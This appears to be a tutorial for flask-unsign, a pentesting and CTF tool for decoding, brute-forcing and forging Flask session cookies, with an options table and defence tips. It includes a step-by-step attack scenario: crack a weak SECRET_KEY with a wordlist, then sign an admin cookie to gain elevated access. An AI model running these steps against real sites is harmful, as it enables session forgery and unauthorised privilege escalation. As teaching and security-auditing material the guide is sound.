# flask-unsign – Flask Session Analysis Tool

`flask-unsign` is a powerful tool used to **decode**, **verify**, **sign**, and even **brute-force** Flask session cookies. It's commonly used for **penetration testing**, **CTF challenges**, and **security auditing**.

> ⚠️ This tool is intended for ethical use and authorized security testing only.

---

## 🛠️ Installation

```bash
pip install flask-unsign
```

---

## 📌 Flask Sessions Overview

Flask stores session data in client-side cookies, which are:
- **Serialized** using JSON
- **Compressed** with zlib
- **Signed** with HMAC using the app’s `SECRET_KEY`

If the `SECRET_KEY` is weak or leaked, session manipulation becomes possible — this is where `flask-unsign` is useful.

---

## 📚 Commands and Usage

### 1. 🔍 Decode a session cookie

Reads and decodes the data from a Flask cookie without verifying the signature.

```bash
flask-unsign --decode --cookie "<cookie_value>"
```

**Example:**
```bash
flask-unsign --decode --cookie "eyJ1c2VyIjoiYWRtaW4ifQ.Yq7qeg.uqTvnYyGLV...=="
```

**Output:**
```json
{
  "user": "admin"
}
```

---

### 2. 🔑 Verify a session cookie (Check signature with a known secret)

Ensures the cookie is signed with the correct `SECRET_KEY`.

```bash
flask-unsign --unsign --cookie "<cookie_value>" --secret "<SECRET_KEY>"
```

**Example:**
```bash
flask-unsign --unsign --cookie "eyJ1c2VyIjoiYWRtaW4ifQ.Yq7qeg..." --secret "mysecretkey"
```

---

### 3. 🧠 Brute-force the `SECRET_KEY`

Attempts to find the secret key by trying a list of common passwords or words.

```bash
flask-unsign --unsign --cookie "<cookie_value>" -w wordlist.txt
```

**Options:**
- `-w`, `--wordlist`: Path to a wordlist file
- `--no-literal-eval`: Avoid using `literal_eval()` (prevents code execution)

**Example:**
```bash
flask-unsign --unsign --cookie "<cookie>" -w rockyou.txt
```

---

### 4. ✍️ Sign a new session cookie (with known secret)

Create a new signed session cookie from a JSON string, using a known `SECRET_KEY`.

```bash
flask-unsign --sign --cookie '{"user":"admin"}' --secret "<SECRET_KEY>"
```

**Example:**
```bash
flask-unsign --sign --cookie '{"user":"admin"}' --secret "mysecretkey"
```

**Output (signed cookie):**
```
eyJ1c2VyIjoiYWRtaW4ifQ.Yq7qeg.MnKjdfg...
```

---

### 5. ⚙️ Full Options Summary

| Option                | Description                              |
|-----------------------|------------------------------------------|
| `--decode`            | Decode a cookie without verifying        |
| `--sign`              | Sign and create a new cookie             |
| `--unsign`            | Verify or brute-force a cookie signature |
| `--cookie <value>`    | The cookie string to work on             |
| `--secret <value>`    | The known secret key                     |
| `--wordlist <path>`   | Path to a wordlist for brute-forcing     |
| `--no-literal-eval`   | Disable `ast.literal_eval` on cookies    |
| `--version`           | Show flask-unsign version                |
| `--help`              | Show command help                        |

---

## 🔐 Example Attack Scenario

1. Target site uses Flask and sets a session like:
   ```python
   session['user'] = 'guest'
   ```

2. Get the cookie:
   ```
   eyJ1c2VyIjoiZ3Vlc3QifQ.Yq7qeg.Nf8d...
   ```

3. Brute-force the `SECRET_KEY`:
   ```bash
   flask-unsign --unsign --cookie "<cookie>" -w wordlist.txt
   ```

4. Sign a new cookie:
   ```bash
   flask-unsign --sign --cookie '{"user":"admin"}' --secret "<discovered_key>"
   ```

5. Send new cookie in browser and gain elevated access.

---

## 🛡️ How to Defend

- Use a long, unpredictable `SECRET_KEY`
- Don’t store sensitive logic in cookies
- Consider server-side session management (e.g., Redis)

---

## 📎 Resources

- GitHub: https://github.com/Paradoxis/flask-unsign  
- Flask session structure: https://flask.palletsprojects.com/

---

## ⚠️ Disclaimer

This tool is for **educational and ethical testing** purposes. Unauthorized use against systems without permission is illegal.
